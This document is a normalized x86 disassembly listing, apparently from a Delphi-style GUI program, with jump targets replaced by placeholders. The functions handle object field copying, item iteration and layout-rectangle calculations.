cmp [ eax + 0x2a ] 0x0
jne r-xdata
mov eax esi
call sub_47b09c
call sub_479044
mov ebp eax
cmp [ esi + 0x50 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov edx esi
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax esi
call sub_4191a8
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
mov [ esi + 0x3c ] 0x0
mov eax esi
call sub_479bf4
call sub_419538
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov eax esi
call sub_4191a8
test eax eax
jle r-xdata
mov eax esi
call sub_479cbc
mov ebx eax
xor bl 0x1
mov [ esi + 0x60 ] bl
mov eax [ esi + 0x4 ]
call sub_419538
dec eax
test eax eax
jl r-xdata
dec edi
cmp edi 0xffffffff
jne r-xdata
mov eax esi
call sub_4191a8
dec eax
push eax
mov eax esi
call sub_47b09c
pop edx
call sub_47a4d4
cmp [ eax + 0x50 ] 0x0
jne r-xdata
inc eax
mov [ esp ] eax
mov eax esi
call sub_4191a8
dec eax
push eax
mov eax esi
call sub_47b09c
pop edx
call sub_47a4d4
mov edx eax
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
dec [ esp ]
jne r-xdata
mov eax esi
call sub_4191a8
inc eax
push eax
mov eax esi
call sub_47b09c
pop edx
call sub_47a4d4
cmp [ eax + 0x50 ] 0x0
jne r-xdata
mov eax esi
call sub_4191a8
push eax
mov eax [ esi + 0x4 ]
call sub_419538
dec eax
pop edx
cmp edx eax
jge r-xdata
jmp r-xdata
mov eax esi
call sub_4191a8
inc eax
push eax
mov eax esi
call sub_47b09c
pop edx
call sub_47a4d4
mov edx eax
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
sub_47ba20
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x38 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_47ba40
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_47ba70
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx esi
mov eax [ ebx + 0x40 ]
call sub_418700
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x40 ]
call sub_418700
mov edx eax
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
retn
sub_47baac
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4463a4
mov eax [ ebx + 0x40 ]
mov esi [ eax + 0x40 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_417088
lea edx [ ebp - 0x14 ]
lea ecx [ ebp - 0xc ]
mov eax esi
call sub_448af0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
xor eax eax
call sub_477b70
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
lea edx [ ebp - 0x24 ]
mov eax [ ebx + 0x40 ]
mov eax [ eax + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x24 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ ebx + 0x40 ]
call sub_403128
sub_47bb40
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ esi + 0x40 ]
mov eax ebx
call sub_44914c
mov edx [ esi + 0x74 ]
mov eax ebx
call sub_44914c
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44fadc
test al al
je r-xdata
sub_47bba4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41875c
inc eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4185a4
mov edx esi
mov eax ebx
call sub_420e08
mov edx ebx
mov eax esi
call sub_47bb40
mov edx ebx
mov eax esi
call sub_47bb88
sub_47bbe4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420d38
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x30 ] eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_47bc30
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420d84
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_47bc94
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421054
dec bl
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx edi
mov eax [ esi + 0x30 ]
call sub_41875c
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ esi + 0x30 ]
call sub_4185f0
sub_47bcdc
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41875c
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x30 ]
call sub_4185f0
mov edx esi
mov eax ebx
call sub_421038
sub_47bd0c
push ebx
mov ebx eax
cmp edx [ ebx + 0x40 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x40 ] edx
mov eax sub_47bb40
mov ecx edx
mov edx ebx
xchg edx eax
call sub_47bdd0
cmp [ ebx + 0x60 ] 0x20000000
jne r-xdata
cmp [ ebx + 0x48 ] 0x20000000
jne r-xdata
mov edx 0x13
mov eax [ ebx + 0x40 ]
call sub_46b0f8
mov [ ebx + 0x60 ] eax
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov edx 0xffffffce
mov eax [ ebx + 0x40 ]
call sub_46b1b8
mov [ ebx + 0x48 ] eax
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_47bd74
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x50 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x50 ] esi
cmp [ ebx + 0x48 ] 0x20000000
jne r-xdata
cmp [ ebx + 0x4c ] 0x20000000
jne r-xdata
mov edx 0xffffffce
mov eax [ ebx + 0x40 ]
call sub_46b1b8
mov [ ebx + 0x48 ] eax
mov edx sub_47bb88
mov ecx esi
mov eax ebx
call sub_47bdd0
mov edx 0x13
mov eax [ ebx + 0x40 ]
call sub_46b0f8
mov [ ebx + 0x4c ] eax
sub_47bdd0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_418700
mov edx ebx
call ebp
inc edi
dec esi
jne r-xdata
sub_47be00
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi esi
mov eax [ edi + 0x34 ]
mov [ ebx + 0x34 ] eax
mov eax [ edi + 0x38 ]
mov [ ebx + 0x38 ] eax
mov eax [ edi + 0x3c ]
mov [ ebx + 0x3c ] eax
mov edx [ edi + 0x40 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov eax [ edi + 0x70 ]
mov [ ebx + 0x70 ] eax
mov eax edi
call sub_47bc60
mov [ ebx + 0x44 ] eax
mov eax [ edi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax [ edi + 0x4c ]
mov [ ebx + 0x4c ] eax
mov edx [ edi + 0x50 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ edi + 0x78 ]
mov [ ebx + 0x78 ] eax
mov eax [ edi + 0x7c ]
mov [ ebx + 0x7c ] eax
mov eax [ edi + 0x80 ]
mov [ ebx + 0x80 ] eax
mov eax [ edi + 0x84 ]
mov [ ebx + 0x84 ] eax
mov eax [ edi + 0x6c ]
mov [ ebx + 0x6c ] eax
mov eax [ edi + 0x54 ]
mov [ ebx + 0x54 ] eax
mov eax [ edi + 0x5c ]
mov [ ebx + 0x5c ] eax
mov eax [ edi + 0x74 ]
mov [ ebx + 0x74 ] eax
mov eax [ edi + 0x68 ]
mov [ ebx + 0x68 ] eax
mov eax [ edi + 0x64 ]
mov [ ebx + 0x64 ] eax
mov eax [ edi + 0x58 ]
mov [ ebx + 0x58 ] eax
mov eax edi
call sub_47bc78
mov [ ebx + 0x60 ] eax
mov eax [ edi + 0x88 ]
mov [ ebx + 0x88 ] eax
mov eax [ edi + 0x8c ]
mov [ ebx + 0x8c ] eax
sub_47bed4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42ead0
mov [ ebx + 0x224 ] 0x1
mov eax ebx
call sub_47e314
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x12c ]
xor eax eax
mov [ ebx + 0x214 ] eax
xor eax eax
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424c18
mov esi eax
mov [ ebx + 0x21c ] esi
mov eax esi
mov edx ebx
call sub_447b60
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0x32
mov eax ebx
call sub_448764
mov edx 0x96
mov eax ebx
call sub_448740
mov [ ebx + 0x1f8 ] 0x1
mov [ ebx + 0x254 ] 0x1
xor eax eax
mov [ ebx + 0x258 ] eax
mov [ ebx + 0x218 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_47bfa4
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47d994
mov eax [ esi + 0x21c ]
call sub_403128
lea eax [ esi + 0x274 ]
call sub_40d31c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_47c018
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_47d448
test al al
je r-xdata
cmp [ esi + 0x16c ] 0x0
je r-xdata
xor edi edi
mov eax ebx
call sub_47d41c
call sub_419538
mov edi eax
jmp r-xdata
mov eax [ esi + 0x16c ]
call sub_4191a8
mov edi eax
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x40 ]
jge r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x44 ]
jge r-xdata
mov al [ ebx + 0x227 ]
test al al
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_44894c
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov al [ ebx + 0x227 ]
sub al 0x2
jne r-xdata
dec edi
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_44894c
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
mov al [ ebx + 0x227 ]
test al al
jne r-xdata
dec edi
mov eax ebx
call sub_47d41c
call sub_419538
cmp edi eax
jle r-xdata
mov al [ ebx + 0x227 ]
sub al 0x2
jne r-xdata
inc edi
test edi edi
jge r-xdata
mov eax ebx
call sub_47d41c
call sub_419538
mov edi eax
inc edi
xor edi edi
jmp r-xdata
sub_47c0f8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c070
xor eax eax
push ebp
push sub_47c17c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x114 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_479af4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x210 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c078
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x108 ]
call sub_403128
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_47c188
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ecc4
mov edx esi
mov eax ebx
call sub_44c528
pop esi
pop ebx
retn
sub_47c1a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x40 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403324
mov ebx eax
test ebx ebx
je r-xdata
call sub_403128
xor edx edx
mov eax edi
call sub_47b56c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c070
xor eax eax
push ebp
push sub_47c292
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov dl 0x6
mov eax [ ebp - 0x8 ]
call sub_448498
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x168 ] edx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x16c ]
mov edx [ ebp - 0x8 ]
call sub_47b56c
mov eax [ ebp - 0x8 ]
mov si 0xffd0
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c078
retn
sub_47c2a4
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c070
xor eax eax
push ebp
push sub_47c3ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_479bf4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_479b80
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_419538
mov edi eax
dec edi
test edi edi
jl r-xdata
call sub_4039a0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_419538
not eax
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c078
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_479c94
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_47a4d4
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd4 ]
mov esi eax
test esi esi
je r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov al [ eax + 0x14 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax esi
call sub_47fcfc
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov dl 0x1
sub_47c3bc
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebp eax
mov eax esi
mov ebx [ r-xdata ]
mov edx ebx
call sub_4032b4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
mov edx ebx
call sub_4032b4
test al al
jne r-xdata
mov ebx eax
test bl bl
je r-xdata
mov al 0x1
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esi + 0x16c ]
test ebx ebx
je r-xdata
xor ebx ebx
cmp [ edi + 0x16c ] 0x0
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
cmp eax [ ebp + 0x268 ]
jle r-xdata
mov eax ebx
call sub_4191a8
push eax
mov eax [ edi + 0x16c ]
call sub_4191a8
pop edx
cmp edx eax
setl al
mov ebx eax
jmp r-xdata
cmp [ edi + 0x57 ] 0x0
je r-xdata
mov eax [ esi + 0x48 ]
cmp eax [ ebp + 0x26c ]
jle r-xdata
mov eax [ esi + 0x4c ]
mov [ ebp + 0x268 ] eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ edi + 0x57 ] 0x0
je r-xdata
mov eax [ edi + 0x4c ]
cmp eax [ ebp + 0x268 ]
jle r-xdata
mov eax [ esi + 0x48 ]
mov [ ebp + 0x26c ] eax
mov eax ebp
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ edi + 0x48 ]
cmp eax [ ebp + 0x26c ]
jle r-xdata
mov eax [ edi + 0x4c ]
mov [ ebp + 0x268 ] eax
mov al [ ebp + 0x227 ]
sub al 0x2
jb r-xdata
mov eax [ edi + 0x48 ]
mov [ ebp + 0x26c ] eax
mov dl 0x2
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0xf8 ]
mov ecx eax
mov eax [ ebp + 0x258 ]
add eax eax
add eax [ ebp + 0x26c ]
add ecx eax
mov edx 0x3
mov eax [ ebp + 0x74 ]
call sub_447c28
sub al 0x2
jae r-xdata
mov ecx [ ebp + 0x254 ]
add ecx ecx
add ecx [ ebp + 0x268 ]
mov edx 0x2
mov eax [ ebp + 0x74 ]
call sub_447c28
jmp r-xdata
sub_47c4f8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov [ ebp - 0x8 ] edi
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x8 ] 0x1
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x48 ]
mov [ ebx + 0x26c ] eax
mov eax [ edi + 0x4c ]
mov [ ebx + 0x268 ] eax
mov al [ ebx + 0x227 ]
sub al 0x1
jb r-xdata
mov eax ebx
call sub_4489f4
sub eax [ ebx + 0x254 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
push eax
mov eax ebx
call sub_4489b0
sub eax [ ebx + 0x254 ]
pop edx
sub eax edx
push eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ ebx + 0x258 ]
mov edx [ ebx + 0x254 ]
pop ecx
call sub_4170c4
push esi
push edi
mov edi esi
lea esi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_47dfd0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
dec al
je r-xdata
mov eax [ esi + 0x4 ]
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
mov eax [ esi ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp + 0x10 ]
mov edx [ ebx + 0x268 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x48 ]
add eax [ ebx + 0x228 ]
add [ esi ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x48 ]
add edx [ ebx + 0x258 ]
cmp eax edx
jge r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_47dfd0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
dec al
je r-xdata
mov eax ebx
call sub_4489f4
sub eax [ esi + 0x4 ]
sub eax [ ebx + 0x254 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
push eax
mov eax ebx
call sub_4489b0
sub eax [ ebx + 0x258 ]
pop edx
sub eax edx
push eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ ebx + 0x258 ]
mov edx [ ebx + 0x254 ]
add edx edx
xor ecx ecx
mov cl [ ebx + 0x25c ]
add edx [ ecx * 4 + rw-data ]
mov ecx [ esi + 0x4 ]
add ecx [ ebx + 0x268 ]
add edx ecx
pop ecx
call sub_4170c4
push esi
mov edi esi
lea esi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
inc [ ebx + 0x250 ]
mov eax [ esi + 0x4 ]
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x48 ]
jge r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_47dfd0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x48 ]
sub ecx edx
mov edi [ ebp - 0x4 ]
mov [ edi ] ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + 0x8 ]
dec ecx
cmp eax ecx
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x48 ]
sub edx eax
sub edx [ ebx + 0x258 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] edx
add eax [ ebx + 0x254 ]
add eax [ ebx + 0x228 ]
sub [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
call sub_4489f4
sub eax [ esi + 0x4 ]
sub eax [ ebx + 0x254 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
push eax
mov eax ebx
call sub_4489b0
sub eax [ ebx + 0x258 ]
pop edx
sub eax edx
push eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ ebx + 0x258 ]
mov edx [ ebx + 0x254 ]
add edx edx
xor ecx ecx
mov cl [ ebx + 0x25c ]
add edx [ ecx * 4 + rw-data ]
mov ecx [ esi + 0x4 ]
add ecx [ ebx + 0x268 ]
add edx ecx
pop ecx
call sub_4170c4
push esi
mov edi esi
lea esi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
inc [ ebx + 0x250 ]
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x4c ]
jge r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_47dfd0
test al al
je r-xdata
add edx [ ebx + 0x228 ]
sub [ esi + 0x8 ] edx
sub [ esi + 0x8 ] edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebx + 0x268 ]
mov [ eax ] edx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
mov eax [ ebp + 0x18 ]
mov edx [ ebx + 0x254 ]
mov [ eax ] edx
jmp r-xdata
mov eax ebx
call sub_4489f4
sub eax [ ebx + 0x254 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
push eax
mov eax ebx
call sub_4489b0
mov ecx eax
sub ecx [ ebx + 0x258 ]
pop eax
sub ecx eax
mov eax [ esi ]
add eax [ ebx + 0x26c ]
mov edx [ ebx + 0x258 ]
add edx edx
add eax edx
xor edx edx
mov dl [ ebx + 0x25c ]
add eax [ edx * 4 + rw-data ]
mov edx [ ebx + 0x254 ]
call sub_4170c4
push esi
mov edi esi
lea esi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
inc [ ebx + 0x24c ]
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x4c ]
jge r-xdata
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ ebx + 0x26c ]
mov [ esi + 0x8 ] eax
mov eax [ esi ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp + 0x14 ]
mov edx [ ebx + 0x26c ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4c ]
add eax [ ebx + 0x228 ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ esi + 0xc ]
sub eax [ edi + 0x4c ]
sub eax [ ebx + 0x228 ]
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
mov eax ebx
call sub_4489f4
sub eax [ edi + 0x4c ]
sub eax [ ebx + 0x258 ]
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
jmp r-xdata
mov eax ebx
call sub_4489f4
sub eax [ ebx + 0x254 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ ebx + 0x258 ]
mov ecx [ esi + 0x8 ]
sub ecx [ ebx + 0x26c ]
mov edx [ ebx + 0x258 ]
add edx edx
sub ecx edx
xor edx edx
mov dl [ ebx + 0x25c ]
sub ecx [ edx * 4 + rw-data ]
mov edx [ ebx + 0x254 ]
call sub_4170c4
push esi
push edi
mov edi esi
lea esi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
inc [ ebx + 0x24c ]
mov edx [ esi + 0x8 ]
